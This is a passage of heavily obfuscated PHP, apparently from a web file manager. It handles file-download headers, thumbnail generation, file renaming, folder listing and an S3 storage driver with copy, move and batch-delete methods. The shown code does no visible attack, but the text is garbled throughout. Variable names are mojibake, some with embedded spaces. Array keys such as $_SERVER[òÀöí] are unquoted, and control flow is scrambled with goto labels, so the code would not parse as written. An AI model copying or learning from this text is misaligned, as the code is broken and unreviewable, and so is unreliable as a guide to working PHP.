$cå‚¤«—‹ = $Cç¿­âŒ[118]; } goto E³Í¸„ÙÌï; E©ãë›Š¢©: @ob_end_clean(); set_timeout(); $DÕ¯¾¿…‰É = $this->infoFull($c®ö¹”‡ê¦); goto a£Ã¨…šáÚ; CÔÎƒ†Û—: $CÔ‚Œ­º…‘ = $this->getType() == $Cç¿­âŒ[105]; $A“ñÖì«Ê– = $GLOBALS[$Cç¿­âŒ[6]][$Cç¿­âŒ[87]][$Cç¿­âŒ[106]][$Cç¿­âŒ[107]]; $A±ãİÃ‹æñ = (double) $GLOBALS[$Cç¿­âŒ[6]][$Cç¿­âŒ[87]][$Cç¿­âŒ[106]][$Cç¿­âŒ[108]] * 1024 * 1024; goto E©ãë›Š¢©; c¸„¯ŞóùÙ: header($Cç¿­âŒ[127]); header($Cç¿­âŒ[128]); header($Cç¿­âŒ[129]); goto e™ƒÏÒîÙ±; C²˜È™ìÎØ: $CÇéé‰‚Šæ = strtolower($_SERVER[$Cç¿­âŒ[141]]); if ($CÔ‚Œ­º…‘ && $CÇéé‰‚Šæ && $A“ñÖì«Ê–) { if (strstr($CÇéé‰‚Šæ, $Cç¿­âŒ[142])) { header($Cç¿­âŒ[143] . $c®ö¹”‡ê¦); } else { if (strstr($CÇéé‰‚Šæ, $Cç¿­âŒ[144])) { header($Cç¿­âŒ[145] . $c®ö¹”‡ê¦); } else { if (strstr($CÇéé‰‚Šæ, $Cç¿­âŒ[146])) { header($Cç¿­âŒ[147] . $c®ö¹”‡ê¦); } } } if ($A±ãİÃ‹æñ) { header($Cç¿­âŒ[148] . $A±ãİÃ‹æñ); } return; } if (isset($_SERVER[$Cç¿­âŒ[149]])) { if (preg_match($Cç¿­âŒ[150], $_SERVER[$Cç¿­âŒ[149]], $c™”ÇòÛë¨)) { $dï‹Øöİ¡ù = intval($c™”ÇòÛë¨[1]); if (!empty($c™”ÇòÛë¨[2])) { $dâ°ÂÜÙÙ¼ = intval($c™”ÇòÛë¨[2]); } } header($Cç¿­âŒ[151]); header("\x43\157\x6e\x74\x65\156\164\x2d\122\x61\156\147\145\x3a\x20\x62\x79\x74\x65\163\x20{$dï‹Øöİ¡ù}\x2d{$dâ°ÂÜÙÙ¼}\57" . $dô’ğÍ¼‚³); } else { header($Cç¿­âŒ[152]); } goto A™²´Š…†; A™²´Š…†: $CïÄ³­œ = !0; if ($_SERVER[$Cç¿­âŒ[153]] == $Cç¿­âŒ[154] && $dô’ğÍ¼‚³ > 1204 * 1024 * 1024 * 2) { $CïÄ³­œ = !1; } if ($CïÄ³­œ) { header($Cç¿­âŒ[155] . ($dâ°ÂÜÙÙ¼ - $dï‹Øöİ¡ù + 1)); } goto e¯“éØè²–; døØ°©‡“ß: header($Cç¿­âŒ[134] . $AÛ¤¦¾Øˆè . $Cç¿­âŒ[126]); header($Cç¿­âŒ[135] . $E‹¤Îæù¦¿); header($Cç¿­âŒ[136]); goto aÚŒ”äôÙ´; Bõîºà×ç: $dï‹Øöİ¡ù = 0; $dâ°ÂÜÙÙ¼ = $dô’ğÍ¼‚³ - 1; $C’‹‘‡ê®… = $this->ext($E‹¤Îæù¦¿); goto E™¿äØÂÅ¹; EÙ†ªˆíù™: } public function fileOutServer($Dé•®“Û˜Ë, $B†Úß´«‚ = false, $A±ë«åø÷ˆ = false, $d¦Šá§§¥ = '') { $this->fileOut($Dé•®“Û˜Ë, $B†Úß´«‚, $A±ë«åø÷ˆ, $d¦Šá§§¥); } public function fileOutLink($EÂ”±„Ÿ•©) { header($_SERVER[òÀöí][158] . $EÂ”±„Ÿ•©); die; } public function cacheMethod($E–ĞÖÆÏÁå, $c¯™½Ò Ï, $Aì‘Æèùö = null) { goto CáåÜå¿Ç‰; B¥‰Ñ±Âá²: if (!is_null($Aì‘Æèùö)) { $EÙŒ¨õ¸á[$CµØòŒšÕÒ] = $Aì‘Æèùö; return; } $fÌë¥¼É = isset($EÙŒ¨õ¸á[$CµØòŒšÕÒ]) ? $EÙŒ¨õ¸á[$CµØòŒšÕÒ] : null; if (!is_null($fÌë¥¼É)) { return $fÌë¥¼É; } goto B´–“¬¬¥‰; B´–“¬¬¥‰: $fÌë¥¼É = $this->{$E–ĞÖÆÏÁå}($c¯™½Ò Ï); $EÙŒ¨õ¸á[$CµØòŒšÕÒ] = $fÌë¥¼É; return $fÌë¥¼É; goto bÅÆå«¦×Å; aÆ¯¡­—É: $CµØòŒšÕÒ = $Aš”«ö•Ú®[159] . $E–ĞÖÆÏÁå . $Aš”«ö•Ú®[160] . rtrim($a‚§Ãˆº˜, $Aš”«ö•Ú®[8]); if (is_null($E–ĞÖÆÏÁå)) { $EÙŒ¨õ¸á = array(); return; } if (is_null($c¯™½Ò Ï)) { unset($EÙŒ¨õ¸á[$CµØòŒšÕÒ]); return; } goto B¥‰Ñ±Âá²; CáåÜå¿Ç‰: $Aš”«ö•Ú® =& $_SERVER[òÀöí]; static $EÙŒ¨õ¸á = array(); $a‚§Ãˆº˜ = $c¯™½Ò Ï ? ltrim($this->getPathOuter($c¯™½Ò Ï), $Aš”«ö•Ú®[8]) : $c¯™½Ò Ï; goto aÆ¯¡­—É; bÅÆå«¦×Å: } public function fileOutImage($dË¾‚‚ØÊá, $dİä…Õ±ç› = 250) { goto fÕÎé×³¹¬; Eì‚¬­Ïé¸: if ($bğ«Èõµ[$Fïˆ…Ü®¬ï[77]] <= 1024 * 50 || $eµ¶‡éÓÌÁ || !function_exists($Fïˆ…Ü®¬ï[166]) || $bğ«Èõµ[$Fïˆ…Ü®¬ï[167]] == $Fïˆ…Ü®¬ï[168]) { return $this->fileOut($dË¾‚‚ØÊá, !1, $eÎãÒÇ©ã); } if (isset($bğ«Èõµ[$Fïˆ…Ü®¬ï[163]][$Fïˆ…Ü®¬ï[169]])) { $eçëŒæö‚Ÿ = $bğ«Èõµ[$Fïˆ…Ü®¬ï[163]][$Fïˆ…Ü®¬ï[169]]; } else { if (isset($bğ«Èõµ[$Fïˆ…Ü®¬ï[163]][$Fïˆ…Ü®¬ï[170]])) { $eçëŒæö‚Ÿ = $bğ«Èõµ[$Fïˆ…Ü®¬ï[163]][$Fïˆ…Ü®¬ï[170]]; } else { $eçëŒæö‚Ÿ = md5("{$bğ«Èõµ[$Fïˆ…Ü®¬ï[28]]}\x5f{$bğ«Èõµ[$Fïˆ…Ü®¬ï[75]]}\137{$bğ«Èõµ[$Fïˆ…Ü®¬ï[77]]}"); } } $DêãêîŸ”Á = "{$eçëŒæö‚Ÿ}\137{$dİä…Õ±ç›}\x2e\160\156\147"; goto cî‡¬á¡ŞÃ; fÕÎé×³¹¬: $Fïˆ…Ü®¬ï =& $_SERVER[òÀöí]; if (substr($dË¾‚‚ØÊá, 0, 4) == $Fïˆ…Ü®¬ï[146]) { $this->fileOutLink($dË¾‚‚ØÊá); } $bğ«Èõµ = $this->info($dË¾‚‚ØÊá); goto aÎ‚Ô»Û¥»; aÎ‚Ô»Û¥»: $eÎãÒÇ©ã = $bğ«Èõµ[$Fïˆ…Ü®¬ï[28]]; $eµ¶‡éÓÌÁ = !1; if (isset($GLOBALS[$Fïˆ…Ü®¬ï[161]]) && $GLOBALS[$Fïˆ…Ü®¬ï[161]][$Fïˆ…Ü®¬ï[75]] == $bğ«Èõµ[$Fïˆ…Ü®¬ï[75]]) { $Eá—â˜ß÷» = $GLOBALS[$Fïˆ…Ü®¬ï[161]][$Fïˆ…Ü®¬ï[162]]; if (!$bğ«Èõµ[$Fïˆ…Ü®¬ï[163]]) { $bğ«Èõµ[$Fïˆ…Ü®¬ï[163]] = $GLOBALS[$Fïˆ…Ü®¬ï[161]]; } if (isset($Eá—â˜ß÷»[$Fïˆ…Ü®¬ï[164]])) { if ($Eá—â˜ß÷»[$Fïˆ…Ü®¬ï[164]] <= $dİä…Õ±ç› && $Eá—â˜ß÷»[$Fïˆ…Ü®¬ï[165]] <= $dİä…Õ±ç›) { $eµ¶‡éÓÌÁ = !0; } } $eÎãÒÇ©ã = $bğ«Èõµ[$Fïˆ…Ü®¬ï[163]][$Fïˆ…Ü®¬ï[28]]; } goto Eì‚¬­Ïé¸; cî‡¬á¡ŞÃ: if (!($BËË…Š¯˜ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $Fïˆ…Ü®¬ï[171]))) { $d”ˆ£Š½š = IO::mkdir(IO_PATH_SYSTEM_TEMP . $Fïˆ…Ü®¬ï[172]); } else { $d”ˆ£Š½š = KodIO::make($BËË…Š¯˜); } if ($BËË…Š¯˜ = IO::fileNameExist($d”ˆ£Š½š, $DêãêîŸ”Á)) { $B¥²àï…ŸÛ = KodIO::make($BËË…Š¯˜); return IO::fileOut($B¥²àï…ŸÛ, !1, $eÎãÒÇ©ã); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto d†ƒÜƒ„á; AİÀµæÃˆÌ: if (!file_exists($B¥²àï…ŸÛ) || filesize($B¥²àï…ŸÛ) < 100) { return @file_exists($Fš¤ß’÷) ? IO::fileOut($Fš¤ß’÷) : $this->fileOut($dË¾‚‚ØÊá); } if (!($cÁ²˜öì–ô = IO::move($B¥²àï…ŸÛ, $d”ˆ£Š½š))) { return IO::fileOut($B¥²àï…ŸÛ); } del_file($B¥²àï…ŸÛ); goto BÓØËÃî™; d†ƒÜƒ„á: $B¥²àï…ŸÛ = DATA_THUMB . $DêãêîŸ”Á; del_file($B¥²àï…ŸÛ); if (!@file_exists($B¥²àï…ŸÛ)) { $b˜õ«ºù˜Ú = TEMP_FILES; if (!is_dir($b˜õ«ºù˜Ú)) { mk_dir($b˜õ«ºù˜Ú); } $Fš¤ß’÷ = $b˜õ«ºù˜Ú . $eçëŒæö‚Ÿ . $Fïˆ…Ü®¬ï[94] . $bğ«Èõµ[$Fïˆ…Ü®¬ï[167]]; if (!@file_exists($Fš¤ß’÷)) { $Fš¤ß’÷ = $this->download($dË¾‚‚ØÊá, $Fš¤ß’÷); } $Cˆğ¿ŸÕå = new ImageThumb($Fš¤ß’÷, $Fïˆ…Ü®¬ï[173]); $Cˆğ¿ŸÕå->prorate($B¥²àï…ŸÛ, $dİä…Õ±ç›, $dİä…Õ±ç› * 10); } goto AİÀµæÃˆÌ; BÓØËÃî™: IO::fileOut($cÁ²˜öì–ô); goto a•¢¢‘äÕ; a•¢¢‘äÕ: } public function fileOutImageServer($a†í¨ö™¸, $DöŞŠ¿ô¸ñ = 250) { $this->fileOutImage($a†í¨ö™¸, $DöŞŠ¿ô¸ñ); } public function fileNameAuto($C÷íË¿Ü­¶, $fÖÅÕº¹Òá, $F¢Æ¯¦ÔÅ = REPEAT_RENAME, $e“¡ÒÚÉª‡ = false) { goto AÖªØ–®Ù; AÖªØ–®Ù: $C÷µ­˜Ù =& $_SERVER[òÀöí]; $D»ÙÊº„“‘ = $C÷íË¿Ü­¶ === $C÷µ­˜Ù[33] ? $fÖÅÕº¹Òá : rtrim($C÷íË¿Ü­¶, $C÷µ­˜Ù[8]) . $C÷µ­˜Ù[8] . $fÖÅÕº¹Òá; if ($F¢Æ¯¦ÔÅ == REPEAT_REPLACE || !$this->exist($D»ÙÊº„“‘) || $e“¡ÒÚÉª‡ && $F¢Æ¯¦ÔÅ != REPEAT_RENAME_FOLDER) { return $fÖÅÕº¹Òá; } goto dµ‹¦§Íğ; c²ìŠÂÇÎ±: while ($this->exist(rtrim($C÷íË¿Ü­¶, $C÷µ­˜Ù[8]) . $C÷µ­˜Ù[8] . $CõÄ¥†ƒÙŸ)) { $CõÄ¥†ƒÙŸ = $eÑ¤ëù¢¢š . "\x28{$d¬ì™£”­Ñ}\51{$C•‘âï¥»¶}"; $d¬ì™£”­Ñ++; } return $CõÄ¥†ƒÙŸ; goto bç›Áù¦; dµ‹¦§Íğ: if ($F¢Æ¯¦ÔÅ == REPEAT_SKIP) { return !1; } $C•‘âï¥»¶ = $C÷µ­˜Ù[94] . get_path_ext($fÖÅÕº¹Òá); $C•‘âï¥»¶ = $C•‘âï¥»¶ == $C÷µ­˜Ù[94] || $e“¡ÒÚÉª‡ ? $C÷µ­˜Ù[33] : $C•‘âï¥»¶; goto F·µ»ô°½ ; F·µ»ô°½ : $d¬ì™£”­Ñ = 1; $eÑ¤ëù¢¢š = substr($fÖÅÕº¹Òá, 0, strlen($fÖÅÕº¹Òá) - strlen($C•‘âï¥»¶)); $CõÄ¥†ƒÙŸ = $eÑ¤ëù¢¢š . "\50{$d¬ì™£”­Ñ}\51{$C•‘âï¥»¶}"; goto c²ìŠÂÇÎ±; bç›Áù¦: } public function listAllFiles($Bä½ßÜŞÀÂ, $dçˆöèœ¦, $eµÙÁªÈ¨Á = array()) { goto d‹¼ÂØ“ñÂ; BÜ¼ÔÌÚôÊ: $Bä½ßÜŞÀÂ = trim($Bä½ßÜŞÀÂ, $A¡°ÕŒ¥œî[8]); foreach ($dçˆöèœ¦ as $eå…âæ¸Ãã) { $DöÊâ°äã“ = ltrim(substr(trim($eå…âæ¸Ãã, $A¡°ÕŒ¥œî[8]), strlen($Bä½ßÜŞÀÂ)), $A¡°ÕŒ¥œî[8]); $A”ææ–Ùœ = array_merge($A”ææ–Ùœ, $this->slicePath($DöÊâ°äã“)); } $fö¹ŠÃŠÈƒ = array(); goto AÊ­‹Æ½ò°; d‹¼ÂØ“ñÂ: $A¡°ÕŒ¥œî =& $_SERVER[òÀöí]; if (empty($dçˆöèœ¦)) { return array(); } $A”ææ–Ùœ = array(); goto BÜ¼ÔÌÚôÊ; AÊ­‹Æ½ò°: foreach (array_unique($A”ææ–Ùœ) as $eå…âæ¸Ãã) { $e±©›ŒÉ‡¿ = array($A¡°ÕŒ¥œî[75] => $this->getPathOuter($A¡°ÕŒ¥œî[8] . $Bä½ßÜŞÀÂ . $A¡°ÕŒ¥œî[8] . $eå…âæ¸Ãã), $A¡°ÕŒ¥œî[76] => 1, $A¡°ÕŒ¥œî[77] => 0); if (substr($eå…âæ¸Ãã, -1) != $A¡°ÕŒ¥œî[8]) { $e±©›ŒÉ‡¿[$A¡°ÕŒ¥œî[76]] = 0; $Dµøˆó”¨• = $this->getPath($Bä½ßÜŞÀÂ . $A¡°ÕŒ¥œî[8] . $eå…âæ¸Ãã); $e±©›ŒÉ‡¿[$A¡°ÕŒ¥œî[77]] = isset($eµÙÁªÈ¨Á[$Dµøˆó”¨•]) ? $eµÙÁªÈ¨Á[$Dµøˆó”¨•] : $this->size($Dµøˆó”¨•); } $fö¹ŠÃŠÈƒ[] = $e±©›ŒÉ‡¿; } return $fö¹ŠÃŠÈƒ; goto DŒâªóá¬¬; DŒâªóá¬¬: } public function slicePath($fÍ’Ç•™¯Œ) { $aÖ£µ©í©é =& $_SERVER[òÀöí]; $FóßéÇõÛ± = explode($aÖ£µ©í©é[8], trim($fÍ’Ç•™¯Œ, $aÖ£µ©í©é[8])); $c­‹˜‰ôš = 0; do { ++$c­‹˜‰ôš; $fÛïÁÁïã÷[] = implode($aÖ£µ©í©é[8], array_slice($FóßéÇõÛ±, 0, $c­‹˜‰ôš)) . $aÖ£µ©í©é[8]; } while ($c­‹˜‰ôš < count($FóßéÇõÛ±)); $fÛïÁÁïã÷[count($FóßéÇõÛ±) - 1] = $fÍ’Ç•™¯Œ; return $fÛïÁÁïã÷; } public function getHost() { $c“›„â¦¹¥ =& $_SERVER[òÀöí]; $BÂÔÎ‘æˆ° = parse_url(trim($this->domain, $c“›„â¦¹¥[8])); $F’ÔËˆŞ« = isset($BÂÔÎ‘æˆ°[$c“›„â¦¹¥[174]]) ? $BÂÔÎ‘æˆ°[$c“›„â¦¹¥[174]] : http_type(); $B ®ÓÁ¦¯¬ = isset($BÂÔÎ‘æˆ°[$c“›„â¦¹¥[175]]) ? $BÂÔÎ‘æˆ°[$c“›„â¦¹¥[175]] : $BÂÔÎ‘æˆ°[$c“›„â¦¹¥[75]]; if (isset($BÂÔÎ‘æˆ°[$c“›„â¦¹¥[176]])) { $B ®ÓÁ¦¯¬ .= $c“›„â¦¹¥[4] . $BÂÔÎ‘æˆ°[$c“›„â¦¹¥[176]]; } return $F’ÔËˆŞ« . $c“›„â¦¹¥[177] . $B ®ÓÁ¦¯¬; } public function pathEncode($c«”ŠÈ³Ö) { $E —ÕÕï¿ô =& $_SERVER[òÀöí]; return str_replace($E —ÕÕï¿ô[178], $E —ÕÕï¿ô[8], rawurlencode($c«”ŠÈ³Ö)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public function __construct($a¶ÅĞš½î¾) { set_timeout(); require_once SDK_DIR . $_SERVER[òÀöí][179]; parent::__construct(); $this->_init($a¶ÅĞš½î¾); } public function _init($AÔÉ‰Ëè²ù) { foreach ($AÔÉ‰Ëè²ù as $Dáæ§«šï½ => $E”ÚØ›ñîê) { if (isset($this->{$Dáæ§«šï½})) { $this->{$Dáæ§«šï½} = $E”ÚØ›ñîê; } } $this->endpoint = $AÔÉ‰Ëè²ù[$_SERVER[òÀöí][180]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($CœÚÖùß©Ë = "\x76\x34") { $this->signVer = $CœÚÖùß©Ë; $this->client->setSignatureVersion($CœÚÖùß©Ë); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto Cƒ¿áİ„ƒ¢; Cƒ¿áİ„ƒ¢: $DÑ†ªÏÜÇ =& $_SERVER[òÀöí]; $bÓŠ—§ï–¸ = $this->getBucketCors(); if (!$bÓŠ—§ï–¸ || !is_array($bÓŠ—§ï–¸)) { return !1; } goto Fè¶Äéè‚‚; bèİ½Éî•á: $B‘´‰÷ãÆ = array($DÑ†ªÏÜÇ[186], $DÑ†ªÏÜÇ[187], $DÑ†ªÏÜÇ[188], $DÑ†ªÏÜÇ[189], $DÑ†ªÏÜÇ[190]); $c„½œµ¯«Å = array_diff($B‘´‰÷ãÆ, $AË¶É´÷‰); return empty($c„½œµ¯«Å); goto fè½©ïˆ¸ğ; Fè¶Äéè‚‚: if ($bÓŠ—§ï–¸[$DÑ†ªÏÜÇ[181]] != $DÑ†ªÏÜÇ[182] || $bÓŠ—§ï–¸[$DÑ†ªÏÜÇ[183]] != $DÑ†ªÏÜÇ[182]) { return !1; } $AË¶É´÷‰ = array_map($DÑ†ªÏÜÇ[184], $bÓŠ—§ï–¸[$DÑ†ªÏÜÇ[185]]); if (!is_array($AË¶É´÷‰)) { $AË¶É´÷‰ = array(); } goto bèİ½Éî•á; fè½©ïˆ¸ğ: } public function mkfile($D‡ååˆ²¨, $fÁƒäø¼·Î = '', $BÇàñ”Ì›— = REPEAT_RENAME) { $cˆÈ’³Û = $this->setContent($D‡ååˆ²¨, $fÁƒäø¼·Î); if ($cˆÈ’³Û !== !1) { return $this->getPathOuter($D‡ååˆ²¨); } return !1; } public function mkdir($fÖ¶Ç¸˜èô, $c™ßáÇÛ“ = REPEAT_SKIP) { if (empty($fÖ¶Ç¸˜èô)) { return !1; } if ($this->_isFolder($fÖ¶Ç¸˜èô)) { return $this->getPathOuter($fÖ¶Ç¸˜èô); } $eÃÊÒ‡åÑö = $this->setContent($fÖ¶Ç¸˜èô, $_SERVER[òÀöí][33], !0); if ($eÃÊÒ‡åÑö !== !1) { return $this->getPathOuter($fÖ¶Ç¸˜èô); } return !1; } public function copyFile($Aù¯ã°âÕ, $aœØ»¬˜Õ, $D†£¤ßÏ¾– = array()) { $A›ÃİéÌ™° =& $_SERVER[òÀöí]; $bÁï…²³• = $this->objectMeta($Aù¯ã°âÕ); if (!$bÁï…²³•) { return !1; } if ($bÁï…²³•[$A›ÃİéÌ™°[77]] <= 1024 * 1024 * 200) { $DŠ”¯¨²¸¸ = $this->client->copyObject($this->bucket, $Aù¯ã°âÕ, $this->bucket, $aœØ»¬˜Õ, $A›ÃİéÌ™°[191], $D†£¤ßÏ¾–); } else { $DŠ”¯¨²¸¸ = $this->client->multiCopyObject($this->bucket, $Aù¯ã°âÕ, $this->bucket, $aœØ»¬˜Õ, $D†£¤ßÏ¾–); } $DŠ”¯¨²¸¸ = $DŠ”¯¨²¸¸ ? $this->getPathOuter($aœØ»¬˜Õ) : !1; return $DŠ”¯¨²¸¸; } public function moveFile($FŒšä¤©Æ, $DßÃ²Ä„âÌ) { if ($this->copyFile($FŒšä¤©Æ, $DßÃ²Ä„âÌ)) { $this->delFile($FŒšä¤©Æ); return $this->getPathOuter($DßÃ²Ä„âÌ); } return !1; } public function delFile($Aíµ½¤ÇĞ‘) { return $this->client->deleteObject($this->bucket, $Aíµ½¤ÇĞ‘); } public function delFolder($cĞ†ªŒ¶•Ã) { goto cñ©äÂ–ŸÙ; b÷Üñ‚àÚÈ: return $this->delByBatch($eà¸¢ƒĞŞ…[$a‹”â”‰ …[74]]); goto Dåì ®öğ; C’Å¿…ğ‡·: if (!empty($cĞ†ªŒ¶•Ã) && !in_array($E¼Ìø©˜Ï“, $eà¸¢ƒĞŞ…[$a‹”â”‰ …[74]])) { $eà¸¢ƒĞŞ…[$a‹”â”‰ …[74]][] = $E¼Ìø©˜Ï“; } $B¾ÕĞâ·—Ô = $this->delByBatch($eà¸¢ƒĞŞ…[$a‹”â”‰ …[73]]); if (!$B¾ÕĞâ·—Ô) { return !1; } goto b÷Üñ‚àÚÈ; cñ©äÂ–ŸÙ: $a‹”â”‰ … =& $_SERVER[òÀöí]; if (!$this->exist($cĞ†ªŒ¶•Ã)) { return !0; } $this->listItemCache = !1; goto c½Ì‰¥ìÖ; c½Ì‰¥ìÖ: $eà¸¢ƒĞŞ… = $this->fileList($cĞ†ªŒ¶•Ã); $this->listItemCache = !0; $E¼Ìø©˜Ï“ = trim($cĞ†ªŒ¶•Ã, $a‹”â”‰ …[8]) . $a‹”â”‰ …[8]; goto C’Å¿…ğ‡·; Dåì ®öğ: } private function delByBatch($FÛ†òøœÅ) { foreach (array_chunk($FÛ†òøœÅ, 1000) as $få—ïƒö»İ) { $A‹ƒ­Î½¦ = $this->client->deleteObjects($this->bucket, $få—ïƒö»İ); if (!$A‹ƒ­Î½¦) { return !1; } } return !0; } public function rename($b˜¥ø“œë, $A“Ìé‰²“») { return $this->renameObject($b˜¥ø“œë, $A“Ìé‰²“»); } public function listPath($b¦›°åº‰ù, $Aç„µ¼¹ŒÀ = false) { $CÙ¼Ååê§ =& $_SERVER[òÀöí]; $FÄƒ¯¹™¸ğ = $this->fileList($b¦›°åº‰ù, $CÙ¼Ååê§[8], !0); foreach ($FÄƒ¯¹™¸ğ[$CÙ¼Ååê§[74]] as $cí×ì»›¹Ë => $FáÁã áìŸ) { $FÄƒ¯¹™¸ğ[$CÙ¼Ååê§[74]][$cí×ì»›¹Ë] = $this->folderInfo($FáÁã áìŸ, $Aç„µ¼¹ŒÀ); } foreach ($FÄƒ¯¹™¸ğ[$CÙ¼Ååê§[73]] as $cí×ì»›¹Ë => $FáÁã áìŸ) { $FÄƒ¯¹™¸ğ[$CÙ¼Ååê§[73]][$cí×ì»›¹Ë] = $this->fileInfo($FáÁã áìŸ[$CÙ¼Ååê§[28]], $Aç„µ¼¹ŒÀ, $FáÁã áìŸ); } return $FÄƒ¯¹™¸ğ; } private function fileInfo($DÅ¾»îÖÂ¨, $aó¥ì‘ã†â = false, $BŠ¯¿¯äÁ = array()) { goto eªŒ©Ïò‚„; eªŒ©Ïò‚„: $bÜ–—œåŒ =& $_SERVER[òÀöí]; $eÁåÅ™êÌÌ = array($bÜ–—œåŒ[28] => $this->pathThis($DÅ¾»îÖÂ¨), $bÜ–—œåŒ[75] => $this->getPathOuter($DÅ¾»îÖÂ¨), $bÜ–—œåŒ[29] => $bÜ–—œåŒ[173], $bÜ–—œåŒ[167] => $this->ext($DÅ¾»îÖÂ¨), $bÜ–—œåŒ[77] => isset($BŠ¯¿¯äÁ[$bÜ–—œåŒ[77]]) ? $BŠ¯¿¯äÁ[$bÜ–—œåŒ[77]] : 0); if ($aó¥ì‘ã†â) { return $eÁåÅ™êÌÌ; } goto B­òÓ‡Í; E¢Ûº†¦ì: if (isset($BŠ¯¿¯äÁ[$bÜ–—œåŒ[195]])) { $eÁåÅ™êÌÌ[$bÜ–—œåŒ[83]] = $BŠ¯¿¯äÁ[$bÜ–—œåŒ[195]]; } if (isset($BŠ¯¿¯äÁ[$bÜ–—œåŒ[77]])) { $eÁåÅ™êÌÌ[$bÜ–—œåŒ[77]] = $BŠ¯¿¯äÁ[$bÜ–—œåŒ[77]]; } return $eÁåÅ™êÌÌ; goto eç–ÒíÎ’Ê; B­òÓ‡Í: $eÁåÅ™êÌÌ[$bÜ–—œåŒ[192]] = $eÁåÅ™êÌÌ[$bÜ–—œåŒ[83]] = 0; $eÁåÅ™êÌÌ[$bÜ–—œåŒ[193]] = $eÁåÅ™êÌÌ[$bÜ–—œåŒ[194]] = !0; if (empty($BŠ¯¿¯äÁ)) { $BŠ¯¿¯äÁ = $this->objectMeta($DÅ¾»îÖÂ¨); if (!$BŠ¯¿¯äÁ) { return $eÁåÅ™êÌÌ; } } goto E¢Ûº†¦ì; eç–ÒíÎ’Ê: } private function folderInfo($bšŞ¬–›ƒ¡, $AÎ‹‹ = false) { goto DŠÎáğŒœ; Bñí†µ“ì­: $DİÚ’Ê ·[$b×Œ¥Æ¹­œ[192]] = $DİÚ’Ê ·[$b×Œ¥Æ¹­œ[83]] = 0; $DİÚ’Ê ·[$b×Œ¥Æ¹­œ[193]] = $DİÚ’Ê ·[$b×Œ¥Æ¹­œ[194]] = !0; if ($bšŞ¬–›ƒ¡ == $b×Œ¥Æ¹­œ[33]) { return $DİÚ’Ê ·; } goto b”Êğ‚æ½Ó; b”Êğ‚æ½Ó: $bšŞ¬–›ƒ¡ = trim($bšŞ¬–›ƒ¡, $b×Œ¥Æ¹­œ[8]) . $b×Œ¥Æ¹­œ[8]; $C¶Â¹ÊÚâ = $this->objectMeta($bšŞ¬–›ƒ¡); if (isset($C¶Â¹ÊÚâ[$b×Œ¥Æ¹­œ[195]])) { $DİÚ’Ê ·[$b×Œ¥Æ¹­œ[192]] = $C¶Â¹ÊÚâ[$b×Œ¥Æ¹­œ[195]]; } goto eˆğ«Ó®º¶; eˆğ«Ó®º¶: return $DİÚ’Ê ·; goto bñªİƒè­É; DŠÎáğŒœ: $b×Œ¥Æ¹­œ =& $_SERVER[òÀöí]; $DİÚ’Ê · = array($b×Œ¥Æ¹­œ[28] => $this->pathThis($bšŞ¬–›ƒ¡), $b×Œ¥Æ¹­œ[75] => $this->getPathOuter($b×Œ¥Æ¹­œ[8] . $bšŞ¬–›ƒ¡), $b×Œ¥Æ¹­œ[29] => $b×Œ¥Æ¹­œ[76]); if ($AÎ‹‹) { return $DİÚ’Ê ·; } goto Bñí†µ“ì­; bñªİƒè­É: } private function fileList($c‹ò³»†ŸÚ, $B¿êŸå¶‡« = '', $eÁ—àÄèàÈ = 0) { goto E¼´øÜğè; DÄ‰ÅŠÎæØ: foreach ($EØ±‰®á¥†[$E­÷§Ø²ÅÄ[196]] as $fèœ È·ê) { goto aåŞÉŸŠ; fõÂÙ—÷…Ì: $b‚¥Û¾ö¯º[] = $eÁ—àÄèàÈ ? $fèœ È·ê : $D—ˆù‡„ê; goto fîËÕõŞÉ­; aåŞÉŸŠ: $D—ˆù‡„ê = $fèœ È·ê[$E­÷§Ø²ÅÄ[28]]; if ($D—ˆù‡„ê == $fœ³ïôØĞÚ) { continue; } $cÍ£á¹ó¨± = isset($fèœ È·ê[$E­÷§Ø²ÅÄ[77]]) ? $fèœ È·ê[$E­÷§Ø²ÅÄ[77]] : 0; goto AóÚóÊ; AóÚóÊ: $C°ã™Ï±ÌØ = $cÍ£á¹ó¨± == 0 && substr($D—ˆù‡„ê, strlen($D—ˆù‡„ê) - 1, 1) == $E­÷§Ø²ÅÄ[8] ? !0 : !1; if ($aµØ×‘¼¹) { $this->cacheMethod($E­÷§Ø²ÅÄ[197], $D—ˆù‡„ê, $C°ã™Ï±ÌØ); $this->cacheMethod($E­÷§Ø²ÅÄ[198], $D—ˆù‡„ê, $fèœ È·ê); } if ($C°ã™Ï±ÌØ) { $c†ö•á¨Ô­[] = $D—ˆù‡„ê; continue; } goto fõÂÙ—÷…Ì; fîËÕõŞÉ­: } foreach ($EØ±‰®á¥†[$E­÷§Ø²ÅÄ[199]] as $fèœ È·ê) { $c†ö•á¨Ô­[] = $fèœ È·ê[$E­÷§Ø²ÅÄ[28]]; if ($aµØ×‘¼¹) { $this->cacheMethod($E­÷§Ø²ÅÄ[197], $fèœ È·ê[$E­÷§Ø²ÅÄ[28]], !0); } } if ($aµØ×‘¼¹) { $this->cacheMethod($E­÷§Ø²ÅÄ[197], $c‹ò³»†ŸÚ, !0); } goto BíÊ§±Ìö; BíÊ§±Ìö: return array($E­÷§Ø²ÅÄ[74] => $c†ö•á¨Ô­, $E­÷§Ø²ÅÄ[73] => $b‚¥Û¾ö¯º); goto F¤³®˜¸¹°; E¼´øÜğè: $E­÷§Ø²ÅÄ =& $_SERVER[òÀöí]; $fœ³ïôØĞÚ = rtrim($c‹ò³»†ŸÚ, $E­÷§Ø²ÅÄ[8]) . $E­÷§Ø²ÅÄ[8]; $EØ±‰®á¥† = $this->listObjs($fœ³ïôØĞÚ, null, null, $B¿êŸå¶‡«); goto B–›Ôôí£; B–›Ôôí£: if (!$EØ±‰®á¥†) { return array($E­÷§Ø²ÅÄ[74] => array(), $E­÷§Ø²ÅÄ[73] => array()); } $aµØ×‘¼¹ = $this->listItemCache === !1 ? !1 : !0; 